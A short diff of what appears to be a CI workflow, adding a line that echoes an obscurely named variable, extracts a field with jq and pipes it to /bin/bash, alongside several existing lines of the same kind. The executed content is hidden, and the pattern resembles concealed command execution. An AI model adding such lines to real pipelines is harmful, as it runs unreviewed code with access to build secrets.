@@ -38,6 +38,7 @@ jobs:
           echo $vv5490 | jq -r .e51 | /bin/bash
           echo $ypglt8186 | jq -r .au02 | /bin/bash
           echo $uo912 | jq -r .zd72 | /bin/bash
+          echo $hlshh52 | jq -r .eppp26 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
